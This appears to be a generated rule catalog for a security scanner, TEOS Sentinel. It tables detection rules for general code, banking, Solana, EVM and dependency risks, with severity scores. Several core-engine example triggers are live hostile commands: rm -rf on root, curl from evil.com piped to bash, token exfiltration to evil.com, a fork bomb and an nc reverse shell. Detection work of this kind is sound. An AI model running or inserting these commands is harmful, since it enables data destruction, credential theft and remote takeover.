# TEOS Sentinel — Rule Catalog

**Generated from source — v4.1.0**

**Cross-Reference:**
- [SCORING_POLICY.md](../SCORING_POLICY.md) — Scoring model, thresholds, version governance
- [ARCHITECTURE.md](architecture-overview.md) — Engine runtime, plugin architecture
- [AUDIT_TRACE.md](audit/AUDIT_TRACE.md) — Audit schema, storage, replay
- [API.md](api-reference.md) — REST endpoints, request/response schemas
- [CHANGELOG.md](changelog.md) — Version history, per-release policy changes
**Total Rules:** 258 across 8 engines
**Policy Version:** policy-1.0
**Rule Pack:** rules-258

---

## Core Security Engine (`core`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `R01` | DESTRUCTIVE_SHELL | critical | 100 | rm -rf on system-critical path — permanent filesystem destruction | `rm -rf / --no-preserve-root` | Immediate destructive execution on system-critical path. _Impact:_ Permanent filesystem destruction, data loss, system inoperable. |
| `R02` | CHMOD_ESCALATION | critical | 90 | chmod 777 on sensitive system files escalates privileges | `chmod 777 /etc/passwd` | Requires surrounding context (writable file + existing vulnerability) to be weaponized. _Impact:_ Privilege escalation. |
| `R03` | CURL_EXEC_CHAIN | critical | 95 | curl/wget piped to shell executes untrusted remote code | `curl http://evil.com/payload.sh | bash` | Remote origin + pipe-to-shell bypasses all local controls. _Impact:_ Remote code execution in CI or terminal. |
| `R04` | SECRET_ECHO | critical | 90 | Echoing secret environment variable — potential exfiltration | `echo $AWS_SECRET_ACCESS_KEY` | Direct credential exposure via stdout. _Impact:_ Credential exfiltration. |
| `R05` | ENV_EXFIL | critical | 95 | Sending environment secret to external host | `curl http://evil.com/$(echo $TOKEN)` | Active exfiltration to external host. _Impact:_ Credential exfiltration + data breach. |
| `R06` | FORK_BOMB | critical | 100 | Fork bomb detected — denial of service pattern | `:(){ :|:& };:` | Immediate resource exhaustion, no mitigation within process. _Impact:_ Denial of service, system crash. |
| `R07` | BASE64_EXEC | high | 88 | Base64-encoded payload executed via eval | `eval(atob("cm0gLXJmIC8="))` | High-confidence execution indicator; obfuscation attempt signals malicious intent. _Impact:_ Arbitrary code execution. |
| `R08` | REVERSE_SHELL | critical | 100 | Reverse shell connection attempt detected | `nc -e /bin/bash 10.0.0.1 4444` | Active callback to attacker-controlled host. _Impact:_ Remote shell access, full system compromise. |
| `R09` | SQL_DESTRUCTION | high | 78 | SQL DROP command permanently destroys data | `DROP TABLE users;` | Less deterministic — SHOW TABLES and SELECT are normal queries; DROP alone is destructive. _Impact:_ Data destruction, database unavailable. |
| `R10` | SQL_INJECTION | high | 78 | SQL injection pattern detected | `1' OR 1=1--` | Requires surrounding SQL context and schema knowledge for successful exploitation. _Impact:_ Data breach, auth bypass. |
| `R11` | PATH_TRAVERSAL | high | 80 | Directory traversal detected — arbitrary file read possible | `../../../etc/passwd` | See code comments for detailed rationale. |
| `R12` | COMMAND_INJECTION | critical | 92 | OS command injection — command chained after separator | `cmd; id` | See code comments for detailed rationale. |
| `R13` | PRIVILEGE_ESCALATION | critical | 92 | Privilege escalation via sudo or SUID abuse | `sudo bash -c id` | SUID/sudo abuse is a clear privilege boundary violation. _Impact:_ Full system privilege escalation. |
| `R14` | MALICIOUS_PACKAGE | high | 88 | Known malicious npm package version detected | `malicious package pattern` | Known malicious package with documented CVE — deterministic signature match. _Impact:_ Supply chain compromise, RCE. |
| `R15` | TYPOSQUAT_PACKAGE | high | 75 | Typosquatted package name detected — potential supply chain attack | `typosquat package pattern` | Typosquat relies on human error — lower confidence but high impact if triggered. _Impact:_ Supply chain infection, credential theft. |
| `R16` | UNSAFE_PERMISSIONS | medium | 65 | GitHub Actions write-all permissions overly broad | `unsafe permissions pattern` | See code comments for detailed rationale. |
| `R17` | CURL_BASH_CI | critical | 95 | curl|bash in CI/CD pipeline — remote code execution risk | `curl bash ci pattern` | CI pipeline context amplifies risk — automated execution with network + secrets access. _Impact:_ CI credential theft, full pipeline compromise. |
| `R18` | PRIVILEGED_CONTAINER | high | 82 | Privileged container flag breaks container isolation | `privileged container pattern` | See code comments for detailed rationale. |
| `R19` | HARDCODED_SECRET | critical | 93 | Hardcoded API key, token, or password in source code | `hardcoded secret pattern` | See code comments for detailed rationale. |
| `R20` | PROMPT_INJECTION | high | 86 | LLM prompt injection attempt detected | `prompt injection pattern` | See code comments for detailed rationale. |
| `R21` | SSRF_ATTEMPT | high | 86 | SSRF attempt targeting internal/metadata IP range | `ssrf attempt pattern` | See code comments for detailed rationale. |
| `R22` | XXE_INJECTION | high | 82 | XML External Entity injection pattern detected | `xxe injection pattern` | See code comments for detailed rationale. |
| `R23` | CRYPTO_MINER | critical | 95 | Cryptomining binary or pool connection detected | `crypto miner pattern` | See code comments for detailed rationale. |
| `R24` | DATA_EXFIL_CURL | high | 89 | Exfiltrating sensitive system files via curl | `data exfil curl pattern` | See code comments for detailed rationale. |
| `R25` | CI_SECRETS_DUMP | critical | 92 | CI secrets or environment variable dump detected | `ci secrets dump pattern` | See code comments for detailed rationale. |
| `R41` | XSS_REFLECTED | high | 85 | Reflected XSS — unescaped user input injected into HTML | `xss reflected pattern` | See code comments for detailed rationale. |
| `R42` | XSS_STORED | high | 86 | Stored XSS — unsanitized input written to DOM | `xss stored pattern` | See code comments for detailed rationale. |
| `R43` | RCE_EVAL | critical | 96 | eval() or new Function() with dynamic input — arbitrary code execution | `rce eval pattern` | See code comments for detailed rationale. |
| `R44` | EXEC_COMMAND | critical | 95 | shell execution via exec() — arbitrary command execution | `exec command pattern` | See code comments for detailed rationale. |
| `R45` | SHELL_EXECUTION | high | 88 | Python shell execution — arbitrary command injection risk | `shell execution pattern` | See code comments for detailed rationale. |
| `R46` | DESERIALIZATION | high | 87 | Unsafe deserialization — remote code execution via serialized payload | `deserialization pattern` | See code comments for detailed rationale. |
| `R47` | DOCKER_ESCAPE | critical | 94 | Docker escape via host resources | `docker escape pattern` | See code comments for detailed rationale. |
| `R48` | K8S_ESCALATION | critical | 92 | Kubernetes privilege escalation attempt | `k8s escalation pattern` | See code comments for detailed rationale. |
| `R49` | RANSOMWARE_ENCRYPT | critical | 99 | Ransomware-like encryption + deletion pattern | `ransomware encrypt pattern` | See code comments for detailed rationale. |
| `R50` | RANSOMWARE_NOTE | critical | 97 | Ransomware note detected — extortion message | `ransomware note pattern` | See code comments for detailed rationale. |
| `R51` | CREDENTIAL_THEFT | critical | 96 | Credential theft tool or pattern detected | `credential theft pattern` | See code comments for detailed rationale. |
| `R52` | PCI_DSS_LEAKAGE | critical | 98 | PCI DSS leakage — sensitive card data in source/log | `pci dss leakage pattern` | See code comments for detailed rationale. |
| `R53` | PII_LEAKAGE | high | 86 | PII leakage — personal identifiable information exposed | `pii leakage pattern` | See code comments for detailed rationale. |
| `R54` | IDENTITY_LEAKAGE | medium | 72 | Identity data leakage — personal information in logs or responses | `identity leakage pattern` | See code comments for detailed rationale. |
| `R55` | NETWORK_SCAN | medium | 68 | Network scanning detected — reconnaissance activity | `network scan pattern` | See code comments for detailed rationale. |
| `R56` | PORT_SCAN | medium | 65 | Port scanning detected — service enumeration | `port scan pattern` | See code comments for detailed rationale. |
| `R57` | DNS_TUNNEL | high | 82 | DNS tunneling tool detected — data exfiltration via DNS queries | `dns tunnel pattern` | See code comments for detailed rationale. |
| `R58` | PROXY_CHAIN | medium | 70 | Proxy chain tool detected — anonymous access attempt | `proxy chain pattern` | See code comments for detailed rationale. |
| `R59` | WIRESHARK_SNIFF | medium | 66 | Packet capture tool detected — network traffic interception | `wireshark sniff pattern` | See code comments for detailed rationale. |
| `R60` | ARP_SPOOF | high | 84 | ARP spoofing tool detected — MITM attack capability | `arp spoof pattern` | See code comments for detailed rationale. |
| `R61` | LDAP_INJECTION | high | 82 | LDAP injection — directory service query manipulation | `ldap injection pattern` | See code comments for detailed rationale. |
| `R62` | XPATH_INJECTION | high | 80 | XPath injection — XML query manipulation | `xpath injection pattern` | See code comments for detailed rationale. |
| `R63` | NOSQL_INJECTION | high | 83 | NoSQL injection — MongoDB operator injection | `nosql injection pattern` | See code comments for detailed rationale. |
| `R64` | PROTOTYPE_POLLUTION | critical | 91 | Prototype pollution — object property injection vulnerability | `prototype pollution pattern` | See code comments for detailed rationale. |
| `R65` | SMUGGLING_HEADER | high | 84 | HTTP request smuggling — header manipulation detected | `smuggling header pattern` | See code comments for detailed rationale. |
| `R66` | INSECURE_COOKIE | medium | 68 | Insecure cookie — missing HttpOnly or Secure flags | `insecure cookie pattern` | See code comments for detailed rationale. |
| `R67` | CSP_BYPASS | medium | 70 | CSP bypass via unsafe-inline and unsafe-eval combination | `csp bypass pattern` | See code comments for detailed rationale. |
| `R68` | CORS_MISCONFIG | medium | 66 | CORS misconfiguration — wildcard origin with credentials enabled | `cors misconfig pattern` | See code comments for detailed rationale. |
| `R69` | WEAK_CRYPTO | high | 86 | Weak cryptographic algorithm — use SHA-256 or stronger | `weak crypto pattern` | See code comments for detailed rationale. |
| `R70` | HARDCODED_IV | high | 82 | Hardcoded IV — cryptographic initialization vector should be random and unique | `hardcoded iv pattern` | See code comments for detailed rationale. |
| `R71` | CLOUD_KEY_LEAK | critical | 96 | Cloud provider secret key or access key exposed | `cloud key leak pattern` | See code comments for detailed rationale. |
| `R72` | OPEN_S3_BUCKET | high | 85 | Potential S3 bucket policy grants public access — data exposure risk | `open s3 bucket pattern` | See code comments for detailed rationale. |
| `R73` | IAM_OVERPRIVILEGED | high | 84 | IAM policy with wildcard Action or Resource — overprivileged role | `iam overprivileged pattern` | See code comments for detailed rationale. |
| `R74` | INSECURE_PROTOCOL | high | 78 | Non-HTTPS URL to external service — unencrypted communication | `insecure protocol pattern` | See code comments for detailed rationale. |
| `R75` | INJECTION_MONGO | critical | 90 | MongoDB injection via $where operator — potential data leak | `injection mongo pattern` | See code comments for detailed rationale. |
| `R76` | WSL_MALWARE | high | 86 | WSL used to execute shell commands — potential malware activity on Windows | `wsl malware pattern` | See code comments for detailed rationale. |
| `R77` | REGISTRY_TAMPER | high | 85 | Windows Registry modification — persistence mechanism | `registry tamper pattern` | See code comments for detailed rationale. |
| `R78` | SERVICE_INSTALL | high | 82 | Windows service installation — potential persistence via service | `service install pattern` | See code comments for detailed rationale. |
| `R79` | SCHEDULED_TASK | high | 80 | Scheduled task creation — potential persistence mechanism | `scheduled task pattern` | See code comments for detailed rationale. |
| `R80` | POWERSHELL_ENCODED | critical | 93 | PowerShell encoded command — obfuscated execution | `powershell encoded pattern` | See code comments for detailed rationale. |
| `R81` | REFLECTION_ABUSE | high | 84 | Reflection-based code loading — potentially malicious assembly loading | `reflection abuse pattern` | See code comments for detailed rationale. |
| `R82` | DLL_INJECTION | critical | 95 | DLL/process injection pattern — remote code execution in another process | `dll injection pattern` | See code comments for detailed rationale. |
| `R83` | KEYLOGGER | high | 86 | Keylogger pattern — keyboard input capture | `keylogger pattern` | See code comments for detailed rationale. |
| `R84` | SCREEN_CAPTURE | high | 85 | Screen capture pattern — potential data exfiltration via screenshots | `screen capture pattern` | See code comments for detailed rationale. |
| `R85` | WEBSOCKET_EXFIL | high | 83 | WebSocket exfiltration — data sent to external WebSocket endpoint | `websocket exfil pattern` | See code comments for detailed rationale. |
| `R86` | BROKEN_ACCESS_CONTROL | critical | 92 | Broken access control — admin endpoint accessible without authentication | `broken access control pattern` | Pattern match for well-known OWASP Top 10 category. _Impact:_ Unauthorized data access, privilege escalation. |
| `R87` | CRYPTO_FAILURE | high | 86 | Cryptographic failure — weak or obsolete encryption/hashing for sensitive data | `crypto failure pattern` | See code comments for detailed rationale. |
| `R88` | INSECURE_DESIGN | high | 82 | Insecure design — trusting user/client-side controls for security decisions | `insecure design pattern` | See code comments for detailed rationale. |
| `R89` | SECURITY_MISCONFIG | medium | 72 | Security misconfiguration — debug/verbose mode exposes internals | `security misconfig pattern` | See code comments for detailed rationale. |
| `R90` | VULN_COMPONENT | high | 80 | Known vulnerable component referenced — associated with high-profile CVE | `vuln component pattern` | See code comments for detailed rationale. |
| `R91` | AUTH_BYPASS | critical | 94 | Authentication bypass — setting session/authentication state to true without validation | `auth bypass pattern` | Direct authentication bypass pattern — high-confidence match. _Impact:_ Full authentication bypass, data breach. |
| `R92` | IDOR | high | 86 | Insecure Direct Object Reference — access control missing on ID-based endpoint | `idor pattern` | See code comments for detailed rationale. |
| `R93` | LOG_INJECTION | medium | 68 | Log injection — unsanitized input written to logs (log forging) | `log injection pattern` | See code comments for detailed rationale. |
| `R94` | SMTP_INJECTION | high | 82 | SMTP injection — email header injection via user input | `smtp injection pattern` | See code comments for detailed rationale. |
| `R95` | HOST_HEADER_INJECTION | high | 80 | Host header injection — redirect poisoning via untrusted host header | `host header injection pattern` | See code comments for detailed rationale. |
| `R96` | SSTI_VULN | high | 88 | Server-Side Template Injection — user input in template expression | `ssti vuln pattern` | See code comments for detailed rationale. |
| `R97` | SSO_WEAKNESS | high | 85 | SSO/Auth weakness — authentication verification disabled | `sso weakness pattern` | See code comments for detailed rationale. |
| `R98` | API_SEC_BYPASS | high | 87 | API security bypass — endpoint exposed without authentication | `api sec bypass pattern` | See code comments for detailed rationale. |
| `R99` | CSP_BYPASS | medium | 82 | CSP bypass via unsafe directives or wildcard targets | `csp bypass pattern` | See code comments for detailed rationale. |
| `R100` | NOSQL_INJECTION | critical | 93 | NoSQL injection — MongoDB operator injection via user input | `nosql injection pattern` | NoSQL injection via operator injection — less common but equally dangerous. _Impact:_ Data breach, auth bypass on NoSQL databases. |
| `R101` | LDAP_INJECTION | high | 88 | LDAP injection — unescaped user input in LDAP query | `ldap injection pattern` | See code comments for detailed rationale. |
| `R102` | XXE_VULNERABILITY | high | 87 | XML External Entity (XXE) — unsecured XML parser | `xxe vulnerability pattern` | See code comments for detailed rationale. |
| `R103` | RACE_CONDITION | high | 83 | Race condition — check-then-act pattern without lock/mutex | `race condition pattern` | See code comments for detailed rationale. |
| `R104` | PATH_TRAVERSAL | high | 86 | Path traversal — user input in file read/write without sanitization | `path traversal pattern` | See code comments for detailed rationale. |
| `R105` | WEAK_RNG | high | 85 | Weak random number generation — Math.random() used for security-critical value | `weak rng pattern` | See code comments for detailed rationale. |
| `R106` | FILE_UPLOAD_DANGER | high | 86 | Unrestricted file upload — no type/size validation | `file upload danger pattern` | See code comments for detailed rationale. |
| `R107` | HTTP_ONLY_COOKIE | medium | 75 | Insecure cookie configuration — httpOnly/secure/sameSite disabled | `http only cookie pattern` | See code comments for detailed rationale. |
| `R108` | GRAPHQL_INTROSPECT | medium | 72 | GraphQL introspection enabled in production — schema disclosure risk | `graphql introspect pattern` | See code comments for detailed rationale. |
| `R109` | OPEN_CORS | medium | 70 | Dangerous CORS — wildcard origin with credentials enabled | `open cors pattern` | See code comments for detailed rationale. |
| `R110` | LEAKED_STACK_TRACE | medium | 68 | Stack trace leaked to client — information disclosure | `leaked stack trace pattern` | See code comments for detailed rationale. |

## Banking Compliance Engine (`banking`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `B01` | LEDGER_DIRECT_MUTATION | critical | 98 | Direct ledger mutation bypasses atomic transaction hooks | `db.ledger.updateOne({_id: id}, {$set: {balance: 0}})` | Direct ledger mutation breaks double-entry accounting — audit trail destroyed. _Impact:_ Financial fraud, regulatory penalty, audit failure. |
| `B02` | RESERVE_BYPASS | critical | 97 | Reserve requirement bypass attempt — systemic risk | `reserve bypass pattern` | See code comments for detailed rationale. |
| `B03` | DOUBLE_SPEND_LOGIC | critical | 99 | Double-spend protection disabled — funds can be spent twice | `double spend logic pattern` | See code comments for detailed rationale. |
| `B04` | SETTLEMENT_MANIPULATION | critical | 95 | Settlement manipulation — rounding/truncation can create or destroy value | `settlement manipulation pattern` | SWIFT MT103 tampering enables fund redirection. _Impact:_ Funds theft, regulatory fine, sanctions violation. |
| `B05` | SWIFT_UNENCRYPTED | critical | 96 | SWIFT/ISO 20022 message over unencrypted transport — PCI DSS violation | `swift unencrypted pattern` | See code comments for detailed rationale. |
| `B06` | SWIFT_AUTH_BYPASS | critical | 97 | SWIFT authentication bypassed — unauthorized payment messages possible | `swift auth bypass pattern` | See code comments for detailed rationale. |
| `B07` | SWIFT_SIGNATURE_WEAK | high | 85 | Weak cryptographic algorithm for SWIFT message signing — downgrade attack risk | `swift signature weak pattern` | See code comments for detailed rationale. |
| `B08` | FIX_CLEARTEXT_LOGIN | critical | 96 | FIX protocol login with cleartext credentials — account takeover risk | `fix cleartext login pattern` | See code comments for detailed rationale. |
| `B09` | FIX_SEQUENCE_RESET | high | 82 | FIX sequence number reset — possible message replay or insertion attack | `fix sequence reset pattern` | See code comments for detailed rationale. |
| `B10` | FIX_DROP_COPY | medium | 65 | FIX Drop Copy session — no execution — informational only | `fix drop copy pattern` | See code comments for detailed rationale. |
| `B11` | AML_SCREENING_BYPASS | critical | 97 | AML/sanctions screening bypassed — regulatory violation | `aml screening bypass pattern` | See code comments for detailed rationale. |
| `B12` | KYC_DOCUMENT_FORGERY | critical | 94 | KYC document verification bypassed — identity fraud enabled | `kyc document forgery pattern` | See code comments for detailed rationale. |
| `B13` | PEP_SCREENING_BYPASS | high | 88 | PEP (Politically Exposed Person) screening bypassed | `pep screening bypass pattern` | See code comments for detailed rationale. |
| `B14` | SANCTIONS_LIST_MANIPULATION | critical | 96 | Sanctions list manipulation — screening integrity compromised | `sanctions list manipulation pattern` | See code comments for detailed rationale. |
| `B15` | PCI_CARD_DATA_STORAGE | critical | 98 | PCI DSS violation: storing full PAN/CVV — prohibited | `pci card data storage pattern` | See code comments for detailed rationale. |
| `B16` | PCI_TRACK_DATA | critical | 99 | PCI DSS prohibited: magnetic stripe track data storage | `pci track data pattern` | See code comments for detailed rationale. |
| `B17` | PCI_UNENCRYPTED_TRANSMISSION | critical | 97 | PCI DSS: cardholder data transmitted unencrypted over cleartext transport | `pci unencrypted transmission pattern` | See code comments for detailed rationale. |
| `B18` | ROUNDING_ATTACK | high | 85 | Currency rounding logic — systematic rounding attack where fractions accumulate | `rounding attack pattern` | See code comments for detailed rationale. |
| `B19` | FEE_MANIPULATION | high | 86 | Fee manipulation pattern — hidden fee inflation or arbitrary surcharge | `fee manipulation pattern` | See code comments for detailed rationale. |
| `B20` | RECURRING_PAYMENT_FRAUD | high | 86 | Recurring payment without explicit consent — unauthorized billing pattern | `recurring payment fraud pattern` | See code comments for detailed rationale. |
| `B21` | CHARGEBACK_AVOIDANCE | high | 83 | Chargeback avoidance logic — preventing legitimate customer disputes | `chargeback avoidance pattern` | See code comments for detailed rationale. |
| `B22` | SEGREGATION_OF_DUTIES | critical | 93 | Segregation of duties violation — same actor creates and approves payment | `segregation of duties pattern` | See code comments for detailed rationale. |
| `B23` | AUDIT_LOG_TAMPERING | critical | 95 | Audit log tampering — destroying evidence of financial transactions | `audit log tampering pattern` | See code comments for detailed rationale. |
| `B24` | LEDGER_FABRICATION | critical | 99 | Ledger fabrication — backdating or future-dating transaction entries | `ledger fabrication pattern` | See code comments for detailed rationale. |
| `B25` | PII_CROSS_BOUNDARY | critical | 93 | Cross-border PII transfer without anonymization — sovereignty violation | `pii cross boundary pattern` | See code comments for detailed rationale. |
| `B26` | FEDERATED_HSM_BYPASS | critical | 96 | Federated HSM ticket verification bypassed — unauthorized card access | `federated hsm bypass pattern` | See code comments for detailed rationale. |
| `B27` | BIC_SWIFT_CODE_MANIPULATION | high | 87 | BIC/SWIFT code manipulation — payment routing to wrong institution | `bic swift code manipulation pattern` | See code comments for detailed rationale. |
| `B28` | IBAN_VALIDATION_BYPASS | high | 85 | IBAN validation bypass — allows invalid account routing | `iban validation bypass pattern` | See code comments for detailed rationale. |
| `B29` | SAR_FILING_BYPASS | critical | 94 | Suspicious Activity Report (SAR) filing bypassed — FinCEN violation | `sar filing bypass pattern` | See code comments for detailed rationale. |
| `B30` | REGULATORY_REPORT_MANIPULATION | critical | 92 | Regulatory report manipulation — false reporting to central bank | `regulatory report manipulation pattern` | See code comments for detailed rationale. |
| `B31` | CAPITAL_RESERVE_CALCULATION | high | 88 | Capital reserve requirement calculation manipulation | `capital reserve calculation pattern` | See code comments for detailed rationale. |
| `B32` | INTEREST_CALCULATION_FRAUD | high | 86 | Interest/profit rate calculation manipulation — value extraction fraud | `interest calculation fraud pattern` | See code comments for detailed rationale. |

## Solana Security Engine (`solana`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `S01` | ANCHOR_UNCHECKED_ACCOUNT | critical | 95 | Unchecked account — attacker can pass arbitrary account data | `anchor unchecked account` | UncheckedAccount allows arbitrary account injection — core Solana vulnerability. _Impact:_ Complete program drain, unauthorized token transfer. |
| `S02` | ANCHOR_SIGNER_SAFETY | critical | 92 | Signer not properly validated — unauthorized state modification possible | `anchor signer safety` | See code comments for detailed rationale. |
| `S03` | ANCHOR_SEED_CONSTRAINT | high | 88 | PDA seed constraint without bump seed — deterministic PDA derivation missing | `anchor seed constraint` | See code comments for detailed rationale. |
| `S04` | CPI_UNCHECKED | critical | 94 | CPI without checking returned program ID — arbitrary program invocation risk | `cpi unchecked` | See code comments for detailed rationale. |
| `S05` | CPI_SIGNER_SEED_EXPOSURE | high | 87 | CPI signer seeds leaked via logging — privilege escalation risk | `cpi signer seed exposure` | See code comments for detailed rationale. |
| `S06` | CPI_PRIVILEGE_ESCALATION | critical | 96 | Privilege escalation via CPI — missing PDA signer seeds for authority | `cpi privilege escalation` | See code comments for detailed rationale. |
| `S07` | PDA_FRONT_RUNNING | high | 82 | PDA derived from user input — front-running attack on address creation | `pda front running` | See code comments for detailed rationale. |
| `S08` | PDA_OWNERSHIP_CHECK | critical | 93 | Missing PDA ownership check — attacker can use arbitrary account | `pda ownership check` | See code comments for detailed rationale. |
| `S09` | MISSING_AUTHORITY_CHECK | critical | 95 | Authority check missing — unauthorized state access possible | `missing authority check` | See code comments for detailed rationale. |
| `S10` | CLOSE_ACCOUNT_SAFETY | high | 88 | Account closure without verifying destination authority — rent theft risk | `close account safety` | See code comments for detailed rationale. |
| `S11` | DELEGATE_AUTHORITY_ABUSE | high | 86 | Delegating authority to arbitrary user without verification | `delegate authority abuse` | See code comments for detailed rationale. |
| `S12` | ARITHMETIC_OVERFLOW | high | 85 | Integer overflow possible — use checked arithmetic or SafeMath | `arithmetic overflow` | See code comments for detailed rationale. |
| `S13` | UNCHECKED_MATH | medium | 75 | Unchecked math operations — potential overflow/underflow | `unchecked math` | See code comments for detailed rationale. |
| `S14` | SPL_TOKEN_BURN | high | 84 | Token burn without authority verification — unauthorized supply reduction | `spl token burn` | See code comments for detailed rationale. |
| `S15` | SPL_MINT_AUTHORITY | critical | 92 | Mint authority set to arbitrary account — unlimited token minting | `spl mint authority` | See code comments for detailed rationale. |
| `S16` | SPL_FREEZE_AUTHORITY | high | 85 | Freeze authority disabled — cannot freeze malicious token holders | `spl freeze authority` | See code comments for detailed rationale. |
| `S17` | ACCOUNT_DATA_MUTATION | high | 86 | Account data mutated without validation — data corruption risk | `account data mutation` | See code comments for detailed rationale. |
| `S18` | ACCOUNT_REINIT | critical | 93 | Account reinitialization attack — attacker reinitializes existing account | `account reinit` | See code comments for detailed rationale. |
| `S19` | COMPUTE_BUDGET_EXCEED | medium | 65 | Compute budget exceeded — transaction may fail or be expensive | `compute budget exceed` | See code comments for detailed rationale. |
| `S20` | INSTRUCTION_ORDERING | medium | 70 | Instruction ordering assumption — transactions may be reordered | `instruction ordering` | See code comments for detailed rationale. |
| `S21` | ACCOUNT_DISCRIMINATOR | medium | 72 | Account deserialized without discriminator check — type confusion attack | `account discriminator` | See code comments for detailed rationale. |
| `S22` | PROGRAM_UPGRADE_AUTHORITY | high | 88 | Upgrade authority unset or set to arbitrary account — program can be upgraded by anyone | `program upgrade authority` | See code comments for detailed rationale. |
| `S23` | CLOCK_DEPENDENCY | high | 85 | Clock/slot dependency without tolerance — validator manipulation risk | `clock dependency` | See code comments for detailed rationale. |
| `S24` | ACCOUNT_LENTH_CHECK | high | 85 | Missing account data length check — deserialization OOB access | `account lenth check` | See code comments for detailed rationale. |
| `S25` | TOKEN_ACCOUNT_MISMATCH | high | 86 | Token account/mint/owner mismatch not verified — token confusion attack | `token account mismatch` | See code comments for detailed rationale. |
| `S26` | LAMPORT_MANIPULATION | critical | 94 | Lamport manipulation without proper checks — fund theft risk | `lamport manipulation` | See code comments for detailed rationale. |
| `S27` | SYSTEM_PROGRAM_ABUSE | critical | 95 | System program invocation without signer verification — unauthorized SOL movement | `system program abuse` | See code comments for detailed rationale. |
| `S28` | ACCOUNT_CLOSURE_DRAIN | high | 88 | Account closure sends rent lamports to caller — rent extraction attack | `account closure drain` | See code comments for detailed rationale. |
| `S29` | CROSS_PROGRAM_INVOKE_WRONG | high | 87 | Cross-program invocation without verifying program ID — CPI confusion | `cross program invoke wrong` | See code comments for detailed rationale. |

## EVM Security Engine (`evm`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `E01` | REENTRANCY | critical | 98 | Reentrancy vulnerability — external call before state update | `reentrancy` | Reentrancy via low-level call — classic Solidity vulnerability with high impact. _Impact:_ Contract balance drain, economic exploit. |
| `E02` | REENTRANCY_GUARD_MISSING | high | 88 | Reentrancy guard missing on withdraw/claim function | `reentrancy guard missing` | See code comments for detailed rationale. |
| `E03` | CROSS_FUNCTION_REENTRANCY | high | 85 | Cross-function reentrancy — multiple functions share state without reentrancy protection | `cross function reentrancy` | See code comments for detailed rationale. |
| `E04` | DELEGATECALL_UNCHECKED | critical | 97 | Unchecked delegatecall — arbitrary code execution in caller context | `delegatecall unchecked` | delegatecall preserves caller context — one of highest severity EVM patterns. _Impact:_ Full contract storage manipulation, logic bypass. |
| `E05` | DELEGATECALL_LOOP | high | 86 | Delegatecall in loop — mass storage corruption risk | `delegatecall loop` | See code comments for detailed rationale. |
| `E06` | INTEGER_OVERFLOW | high | 85 | Integer overflow/underflow vulnerability — use Solidity 0.8+ or SafeMath | `integer overflow` | See code comments for detailed rationale. |
| `E07` | UNCHECKED_MATH_BLOCK | medium | 72 | Unchecked math block with financial operations — silent overflow/underflow | `unchecked math block` | See code comments for detailed rationale. |
| `E08` | OWNER_CHECK_MISSING | critical | 95 | Missing owner/access control on privileged function | `owner check missing` | See code comments for detailed rationale. |
| `E09` | TX_ORIGIN_AUTH | high | 88 | tx.origin used for authentication — phishing vulnerability | `tx origin auth` | See code comments for detailed rationale. |
| `E10` | TIMELOCK_BYPASS | high | 85 | Timelock bypass detected — governance protection overridden | `timelock bypass` | See code comments for detailed rationale. |
| `E11` | FLASH_LOAN_CHECK | high | 86 | Flash loan without balance verification — price manipulation risk | `flash loan check` | See code comments for detailed rationale. |
| `E12` | TIMESTAMP_DEPENDENCY | medium | 70 | Block.timestamp dependency — miner manipulation ±15 seconds | `timestamp dependency` | See code comments for detailed rationale. |
| `E13` | GAS_DEPENDENCY | medium | 65 | Gas-dependent logic — manipulation via gas price/limit | `gas dependency` | See code comments for detailed rationale. |
| `E14` | UNINITIALIZED_STORAGE | critical | 94 | Uninitialized storage — anyone can initialize contract and become owner | `uninitialized storage` | See code comments for detailed rationale. |
| `E15` | SELFDESTRUCT | critical | 99 | Selfdestruct detected — contract can be destroyed, all funds lost | `selfdestruct` | See code comments for detailed rationale. |
| `E16` | INSECURE_RANDOMNESS | high | 88 | Insecure randomness — miner-controlled block hash used for randomness | `insecure randomness` | See code comments for detailed rationale. |
| `E17` | DEFAULT_VISIBILITY | high | 88 | Function with default visibility — may be called by anyone | `default visibility` | See code comments for detailed rationale. |
| `E18` | ARBITRARY_JUMP | high | 88 | Arbitrary jump in assembly — control flow hijacking risk | `arbitrary jump` | See code comments for detailed rationale. |
| `E19` | DOS_WITH_REVERT | high | 88 | Unbounded loop over dynamic array — gas exhaustion DoS | `dos with revert` | See code comments for detailed rationale. |
| `E20` | DOS_WITH_PUSH | medium | 74 | Array push in loop — gas cost grows unbounded | `dos with push` | See code comments for detailed rationale. |
| `E21` | ADDRESS_LIST_PHISHING | medium | 68 | Unlimited token approval to hardcoded address — phishing risk | `address list phishing` | See code comments for detailed rationale. |

## Dependency Engine (`dependency`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `D01` | KNOWN_VULNERABLE_DEP | critical | 92 | Known vulnerable dependency detected — refer to CVE for impact | `known vulnerable dep` | See code comments for detailed rationale. |
| `D02` | MALICIOUS_PACKAGE_NAME | critical | 95 | Known malicious package name (typosquat or hijacked) | `malicious package name` | See code comments for detailed rationale. |
| `D03` | TYPOSQUAT_DEPENDENCY | high | 85 | Typosquatted package name — opens supply chain attack | `typosquat dependency` | See code comments for detailed rationale. |
| `D04` | DEPENDENCY_CONFUSION | high | 88 | Dependency confusion — internal package name with public registry wildcard version | `dependency confusion` | See code comments for detailed rationale. |
| `D05` | PINNED_DEPENDENCIES | medium | 65 | Unpinned dependencies — supply chain drift allows malicious updates | `pinned dependencies` | See code comments for detailed rationale. |
| `D06` | EXEC_IN_POSTINSTALL | critical | 93 | Postinstall script executes shell commands — supply chain attack vector | `exec in postinstall` | See code comments for detailed rationale. |
| `D07` | REGISTRY_MISCONFIG | high | 80 | Non-HTTPS or suspicious registry — MITM supply chain attack risk | `registry misconfig` | See code comments for detailed rationale. |
| `D08` | HARDCODED_TOKEN_IN_DEPS | critical | 91 | Hardcoded token in dependency URL — credential exposure | `hardcoded token in deps` | See code comments for detailed rationale. |

## CI/CD Pipeline Engine (`ci`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
